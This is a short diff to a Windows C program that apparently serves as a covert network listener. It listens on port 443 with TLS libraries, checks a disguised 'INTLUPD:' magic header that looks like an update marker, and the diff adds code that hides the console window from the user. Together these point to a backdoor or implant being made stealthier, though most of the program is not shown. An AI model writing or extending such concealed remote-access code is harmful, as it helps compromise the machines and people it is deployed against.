@@ -1,23 +1,23 @@
+#define SECURITY_WIN32
+#define WIN32_LEAN_AND_MEAN
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <wincrypt.h>
 #include <schannel.h>
 #include <security.h>
 #include <secext.h>
+#include <objbase.h>
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <wmistr.h>
-#include <evntrace.h>
-#include <comutil.h>
-#include <WbemIdl.h>
 
-#pragma comment(lib, "wbemuuid.lib")
-#pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "secur32.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "user32.lib")
 
 #define LISTEN_PORT 443
 #define MAGIC_HEADER "INTLUPD:"
@@ -53,6 +53,12 @@ int main()
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
         return 1;
+    }
+
+    // Hide console window
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd) {
+        ShowWindow(hwnd, SW_HIDE);
     }
 
     // Create TCP socket
